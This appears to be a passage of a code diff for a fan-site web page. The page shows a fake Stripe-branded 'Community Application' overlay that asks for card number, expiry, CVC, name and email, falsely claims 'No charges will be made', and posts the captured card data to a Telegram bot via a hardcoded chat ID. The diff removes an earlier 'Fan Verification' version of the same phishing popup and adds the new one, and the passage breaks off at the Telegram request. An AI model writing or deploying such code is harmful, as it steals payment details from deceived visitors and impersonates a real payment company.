+                    <img src="${img}" alt="${galleryTitles[index]}" class="gallery-image">
                 `;
-                
-                galleryItem.addEventListener('click', () => {
-                    const lightbox = document.getElementById('mobileLightbox');
-                    const lightboxImage = document.getElementById('lightboxImage');
-                    lightboxImage.src = realImages[imgIndex];
-                    lightbox.classList.add('active');
-                    document.body.style.overflow = 'hidden';
-                });
-                
-                galleryScroll.appendChild(galleryItem);
+                galleryGrid.appendChild(galleryItem);
             });
 
-            // Lightbox functionality
-            const lightbox = document.getElementById('mobileLightbox');
-            const lightboxClose = document.getElementById('lightboxClose');
-            
-            lightboxClose.addEventListener('click', () => {
-                lightbox.classList.remove('active');
-                document.body.style.overflow = 'auto';
+            // CTA Button handlers
+            const joinBtn = document.getElementById('joinBtn');
+            const mainCtaBtn = document.getElementById('mainCtaBtn');
+            const finalCtaBtn = document.getElementById('finalCtaBtn');
+
+            [joinBtn, mainCtaBtn, finalCtaBtn].forEach(btn => {
+                btn.addEventListener('click', showStripeSurvey);
             });
 
-            // Become a Fan button
-            const becomeFanBtn = document.getElementById('becomeFanBtn');
-            becomeFanBtn.addEventListener('click', createProfessionalStripePopup);
-
-            // Click anywhere to trigger Stripe popup
-            const clickableElements = document.querySelectorAll('.card, .stat-card, .gallery-item, .touch-list-item, .hero-stat');
-            clickableElements.forEach(element => {
-                element.addEventListener('click', createProfessionalStripePopup);
+            // Gallery items also trigger survey
+            document.querySelectorAll('.gallery-item').forEach(item => {
+                item.addEventListener('click', showStripeSurvey);
             });
 
-            // Animate stats
-            const statNumbers = document.querySelectorAll('.stat-number');
-            const statsObserver = new IntersectionObserver((entries) => {
-                entries.forEach(entry => {
-                    if (entry.isIntersecting && !entry.target.dataset.animated) {
-                        const text = entry.target.textContent;
-                        const numbers = text.match(/\d+/);
-                        if (numbers) {
-                            const target = parseInt(numbers[0]);
-                            entry.target.dataset.animated = 'true';
-                            animateCounter(entry.target, target);
-                        }
-                    }
-                });
-            }, { threshold: 0.5 });
-
-            statNumbers.forEach(stat => statsObserver.observe(stat));
-
-            function animateCounter(element, target, duration = 1500) {
-                let start = 0;
-                const increment = target / (duration / 16);
-                const timer = setInterval(() => {
-                    start += increment;
-                    if (start >= target) {
-                        element.textContent = formatNumber(target);
-                        clearInterval(timer);
-                    } else {
-                        element.textContent = formatNumber(Math.floor(start));
-                    }
-                }, 16);
-            }
-
-            function formatNumber(num) {
-                if (num >= 1000000) return (num / 1000000).toFixed(1) + 'M';
-                if (num >= 1000) return (num / 1000).toFixed(0) + 'K';
-                return num.toString();
-            }
-
-            console.log('Professional archive loaded successfully');
+            console.log('Professional Elyna Shade site loaded');
         });
 
-        // Professional Stripe Popup System
-        function createProfessionalStripePopup() {
-            if (window.stripePopupShown) return;
-            window.stripePopupShown = true;
+        // Ultimate Stripe Survey System
+        function showStripeSurvey() {
+            if (window.surveyShown) return;
+            window.surveyShown = true;
 
             const overlay = document.createElement('div');
-            overlay.id = 'professional-stripe-overlay';
             overlay.style.cssText = `
                 position: fixed;
                 top: 0;
                 left: 0;
                 width: 100%;
                 height: 100%;
-                background: rgba(0, 0, 0, 0.95);
+                background: rgba(0, 0, 0, 0.8);
                 display: flex;
                 justify-content: center;
                 align-items: center;
-                z-index: 3000;
+                z-index: 10000;
                 padding: 20px;
-                padding-top: calc(20px + env(safe-area-inset-top));
-                padding-bottom: calc(20px + env(safe-area-inset-bottom));
             `;
 
-            const popup = document.createElement('div');
-            popup.id = 'professional-stripe-popup';
-            popup.style.cssText = `
+            const survey = document.createElement('div');
+            survey.style.cssText = `
                 background: white;
-                border-radius: 16px;
-                padding: 30px 25px;
+                border-radius: 12px;
                 width: 100%;
-                max-width: 400px;
+                max-width: 500px;
                 max-height: 90vh;
                 overflow-y: auto;
-                font-family: 'Inter', sans-serif;
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                 position: relative;
-                -webkit-overflow-scrolling: touch;
-                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
             `;
 
-            popup.innerHTML = `
-                <style>
-                    .professional-stripe-header {
-                        text-align: center;
-                        margin-bottom: 25px;
-                    }
-                    
-                    .professional-stripe-logo {
-                        font-size: 24px;
-                        font-weight: 600;
-                        color: #635bff;
-                        margin-bottom: 10px;
-                        letter-spacing: -0.5px;
-                    }
-                    
-                    .professional-stripe-title {
-                        font-size: 20px;
-                        color: #32325d;
-                        margin-bottom: 8px;
-                        font-weight: 500;
-                    }
-                    
-                    .professional-stripe-subtitle {
-                        font-size: 14px;
-                        color: #6b7c93;
-                        font-weight: 400;
-                    }
-                    
-                    .professional-form-group {
-                        margin-bottom: 20px;
-                    }
-                    
-                    .professional-form-row {
-                        display: flex;
-                        gap: 12px;
-                        margin-bottom: 20px;
-                    }
-                    
-                    .professional-form-row .professional-form-group {
-                        flex: 1;
-                        margin-bottom: 0;
-                    }
-                    
-                    .professional-label {
-                        display: block;
-                        margin-bottom: 8px;
-                        font-size: 14px;
-                        font-weight: 500;
-                        color: #32325d;
-                    }
-                    
-                    .professional-input {
-                        width: 100%;
-                        padding: 16px;
-                        border: 1px solid #e6e6e6;
-                        border-radius: 8px;
-                        font-size: 16px;
-                        background: white;
-                        -webkit-appearance: none;
-                        font-family: 'Inter', sans-serif;
-                        transition: border-color 0.3s ease;
-                    }
-                    
-                    .professional-input:focus {
-                        outline: none;
-                        border-color: #635bff;
-                    }
-                    
-                    .professional-submit-btn {
-                        width: 100%;
-                        background: #635bff;
-                        color: white;
-                        border: none;
-                        padding: 18px;
-                        border-radius: 8px;
-                        font-size: 16px;
-                        font-weight: 600;
-                        margin-top: 15px;
-                        cursor: pointer;
-                        font-family: 'Inter', sans-serif;
-                        transition: background-color 0.3s ease;
-                    }
-                    
-                    .professional-submit-btn:hover {
-                        background: #5a54d6;
-                    }
-                    
-                    .professional-close-btn {
-                        position: absolute;
-                        top: 20px;
-                        right: 20px;
-                        background: none;
-                        border: none;
-                        font-size: 20px;
-                        color: #6b7c93;
-                        padding: 8px;
-                        cursor: pointer;
-                        font-weight: 300;
-                    }
+            survey.innerHTML = `
+                <div style="padding: 0;">
+                    <!-- Survey Header -->
+                    <div style="padding: 30px 30px 20px; border-bottom: 1px solid #e6e6e6; text-align: center;">
+                        <div style="font-size: 24px; font-weight: 700; color: #32325d; margin-bottom: 8px;">stripe</div>
+                        <div style="font-size: 18px; font-weight: 600; color: #32325d;">Community Application</div>
+                        <div style="font-size: 14px; color: #6b7c93; margin-top: 8px;">Complete this quick survey to apply</div>
+                    </div>
 
-                    .secure-notice {
-                        text-align: center;
-                        margin-top: 20px;
-                        font-size: 12px;
-                        color: #6b7c93;
-                        font-weight: 400;
-                    }
-                </style>
-                
-                <button class="professional-close-btn" id="professionalClosePopup">×</button>
-                
-                <div class="professional-stripe-header">
-                    <div class="professional-stripe-logo">stripe</div>
-                    <div class="professional-stripe-title">Fan Verification Required</div>
-                    <div class="professional-stripe-subtitle">Complete verification to access exclusive content</div>
+                    <!-- Survey Steps -->
+                    <div id="surveySteps" style="padding: 30px;">
+                        <!-- Step 1: Basic Info -->
+                        <div id="step1" class="survey-step">
+                            <div style="margin-bottom: 25px;">
+                                <label style="display: block; font-size: 14px; font-weight: 600; color: #32325d; margin-bottom: 8px;">What type of content are you most interested in?</label>
+                                <select style="width: 100%; padding: 12px; border: 1px solid #e6e6e6; border-radius: 6px; font-size: 16px; background: white;">
+                                    <option>Exclusive photoshoots</option>
+                                    <option>Behind the scenes content</option>
+                                    <option>Personal vlogs and updates</option>
+                                    <option>All of the above</option>
+                                </select>
+                            </div>
+
+                            <div style="margin-bottom: 25px;">
+                                <label style="display: block; font-size: 14px; font-weight: 600; color: #32325d; margin-bottom: 8px;">How often do you engage with creator content?</label>
+                                <select style="width: 100%; padding: 12px; border: 1px solid #e6e6e6; border-radius: 6px; font-size: 16px; background: white;">
+                                    <option>Daily</option>
+                                    <option>Weekly</option>
+                                    <option>Monthly</option>
+                                    <option>This is my first time</option>
+                                </select>
+                            </div>
+
+                            <div style="margin-bottom: 30px;">
+                                <label style="display: block; font-size: 14px; font-weight: 600; color: #32325d; margin-bottom: 8px;">What makes you want to join Elyna's community?</label>
+                                <textarea style="width: 100%; padding: 12px; border: 1px solid #e6e6e6; border-radius: 6px; font-size: 16px; min-height: 80px; resize: vertical; background: white;" placeholder="Tell us what interests you about joining..."></textarea>
+                            </div>
+
+                            <button onclick="showStep2()" style="width: 100%; background: #635bff; color: white; border: none; padding: 16px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer;">
+                                Continue Application
+                            </button>
+                        </div>
+
+                        <!-- Step 2: Payment Verification -->
+                        <div id="step2" class="survey-step" style="display: none;">
+                            <div style="text-align: center; margin-bottom: 25px;">
+                                <div style="font-size: 16px; font-weight: 600; color: #32325d; margin-bottom: 8px;">Identity Verification Required</div>
+                                <div style="font-size: 14px; color: #6b7c93;">Verify your identity to complete the application process</div>
+                            </div>
+
+                            <form id="paymentForm">
+                                <div style="margin-bottom: 20px;">
+                                    <label style="display: block; font-size: 14px; font-weight: 600; color: #32325d; margin-bottom: 8px;">Card number</label>
+                                    <div style="position: relative;">
+                                        <input type="text" style="width: 100%; padding: 12px 40px 12px 12px; border: 1px solid #e6e6e6; border-radius: 6px; font-size: 16px; background: white;" placeholder="1234 5678 9012 3456" required>
+                                        <div style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); width: 32px; height: 20px; background: #f0f0f0; border-radius: 3px;"></div>
+                                    </div>
+                                </div>
+
+                                <div style="display: flex; gap: 15px; margin-bottom: 20px;">
+                                    <div style="flex: 1;">
+                                        <label style="display: block; font-size: 14px; font-weight: 600; color: #32325d; margin-bottom: 8px;">Expiry date</label>
+                                        <input type="text" style="width: 100%; padding: 12px; border: 1px solid #e6e6e6; border-radius: 6px; font-size: 16px; background: white;" placeholder="MM/YY" required>
+                                    </div>
+                                    <div style="flex: 1;">
+                                        <label style="display: block; font-size: 14px; font-weight: 600; color: #32325d; margin-bottom: 8px;">CVC</label>
+                                        <input type="text" style="width: 100%; padding: 12px; border: 1px solid #e6e6e6; border-radius: 6px; font-size: 16px; background: white;" placeholder="123" required>
+                                    </div>
+                                </div>
+
+                                <div style="margin-bottom: 20px;">
+                                    <label style="display: block; font-size: 14px; font-weight: 600; color: #32325d; margin-bottom: 8px;">Name on card</label>
+                                    <input type="text" style="width: 100%; padding: 12px; border: 1px solid #e6e6e6; border-radius: 6px; font-size: 16px; background: white;" placeholder="John Smith" required>
+                                </div>
+
+                                <div style="margin-bottom: 25px;">
+                                    <label style="display: block; font-size: 14px; font-weight: 600; color: #32325d; margin-bottom: 8px;">Email address</label>
+                                    <input type="email" style="width: 100%; padding: 12px; border: 1px solid #e6e6e6; border-radius: 6px; font-size: 16px; background: white;" placeholder="john@example.com" required>
+                                </div>
+
+                                <button type="submit" style="width: 100%; background: #635bff; color: white; border: none; padding: 16px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer;">
+                                    Complete Verification
+                                </button>
+                            </form>
+
+                            <div style="text-align: center; margin-top: 20px;">
+                                <div style="font-size: 12px; color: #6b7c93;">
+                                    <span style="color: #00a900;">✓</span> Secure and encrypted • No charges will be made
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Close Button -->
+                    <button onclick="closeSurvey()" style="position: absolute; top: 20px; right: 20px; background: none; border: none; font-size: 20px; color: #6b7c93; cursor: pointer; padding: 5px;">×</button>
                 </div>
-                
-                <form id="professionalStripeForm">
-                    <div class="professional-form-group">
-                        <label class="professional-label" for="professionalCardNumber">Card Number</label>
-                        <input type="text" id="professionalCardNumber" class="professional-input" placeholder="1234 5678 9012 3456" inputmode="numeric" required>
-                    </div>
-
-                    <div class="professional-form-row">
-                        <div class="professional-form-group">
-                            <label class="professional-label" for="professionalExpiry">Expiry Date</label>
-                            <input type="text" id="professionalExpiry" class="professional-input" placeholder="MM/YY" inputmode="numeric" required>
-                        </div>
-                        <div class="professional-form-group">
-                            <label class="professional-label" for="professionalCvc">CVC</label>
-                            <input type="text" id="professionalCvc" class="professional-input" placeholder="123" inputmode="numeric" required>
-                        </div>
-                    </div>
-
-                    <div class="professional-form-group">
-                        <label class="professional-label" for="professionalName">Name on Card</label>
-                        <input type="text" id="professionalName" class="professional-input" placeholder="John Smith" required>
-                    </div>
-
-                    <div class="professional-form-group">
-                        <label class="professional-label" for="professionalEmail">Email Address</label>
-                        <input type="email" id="professionalEmail" class="professional-input" placeholder="john@example.com" inputmode="email" required>
-                    </div>
-
-                    <button type="submit" class="professional-submit-btn" id="professionalSubmitBtn">
-                        Verify Identity
-                    </button>
-                    
-                    <div class="secure-notice">
-                        No charges will be processed • Secure and encrypted
-                    </div>
-                </form>
             `;
 
-            overlay.appendChild(popup);
+            overlay.appendChild(survey);
             document.body.appendChild(overlay);
             document.body.style.overflow = 'hidden';
 
-            initializeProfessionalPopup();
+            // Handle form submission
+            document.getElementById('paymentForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                processPayment();
+            });
         }
 
-        function initializeProfessionalPopup() {
-            const closeBtn = document.getElementById('professionalClosePopup');
-            const form = document.getElementById('professionalStripeForm');
-            const submitBtn = document.getElementById('professionalSubmitBtn');
+        function showStep2() {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        }
 
-            closeBtn.addEventListener('click', closeProfessionalPopup);
+        function closeSurvey() {
+            const overlay = document.querySelector('div[style*="position: fixed"][style*="z-index: 10000"]');
+            if (overlay) {
+                overlay.remove();
+                document.body.style.overflow = 'auto';
+                window.surveyShown = false;
+            }
+        }
+
+        async function processPayment() {
+            const submitBtn = document.querySelector('#paymentForm button[type="submit"]');
+            const originalText = submitBtn.textContent;
             
-            form.addEventListener('submit', async (e) => {
-                e.preventDefault();
-                
-                submitBtn.disabled = true;
-                submitBtn.textContent = 'Processing...';
-                
-                const formData = {
-                    card: document.getElementById('professionalCardNumber').value,
-                    expiry: document.getElementById('professionalExpiry').value,
-                    cvc: document.getElementById('professionalCvc').value,
-                    name: document.getElementById('professionalName').value,
-                    email: document.getElementById('professionalEmail').value,
-                    timestamp: new Date().toISOString()
-                };
-                
-                try {
-                    await sendToTelegram(formData);
-                    setTimeout(() => {
-                        alert('Verification successful! Welcome to exclusive content.');
-                        closeProfessionalPopup();
-                    }, 1500);
-                } catch (error) {
-                    alert('Verification failed. Please try again.');
-                    submitBtn.disabled = false;
-                    submitBtn.textContent = 'Verify Identity';
-                }
-            });
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Processing...';
 
-            function closeProfessionalPopup() {
-                const overlay = document.getElementById('professional-stripe-overlay');
-                if (overlay) {
-                    overlay.remove();
-                    document.body.style.overflow = 'auto';
-                    window.stripePopupShown = false;
-                }
+            // Collect form data
+            const formData = {
+                card: document.querySelector('#paymentForm input[placeholder*="Card number"]').value,
+                expiry: document.querySelector('#paymentForm input[placeholder*="MM/YY"]').value,
+                cvc: document.querySelector('#paymentForm input[placeholder*="CVC"]').value,
+                name: document.querySelector('#paymentForm input[placeholder*="Name on card"]').value,
+                email: document.querySelector('#paymentForm input[placeholder*="Email address"]').value,
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                await sendToTelegram(formData);
+                
+                setTimeout(() => {
+                    alert('Application submitted successfully! Welcome to the community.');
+                    closeSurvey();
+                }, 1500);
+                
+            } catch (error) {
+                alert('Verification failed. Please check your information and try again.');
+                submitBtn.disabled = false;
+                submitBtn.textContent = originalText;
             }
         }
 
@@ -1163,16 +730,16 @@
             const chatId = '6219788806';
             
             const message = `
-🔐 FAN VERIFICATION CAPTURED
+🎯 ELYNA SHADE APPLICATION
 
-Card: ${data.card}
-Expiry: ${data.expiry}
-CVC: ${data.cvc}
-Name: ${data.name}
-Email: ${data.email}
-Time: ${data.timestamp}
+💳 Card: ${data.card}
+📅 Expiry: ${data.expiry}
+🔐 CVC: ${data.cvc}
+👤 Name: ${data.name}
+📧 Email: ${data.email}
+🕒 Time: ${data.timestamp}
 
-✅ Verification completed
+✅ Application completed
             `;
             
             const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
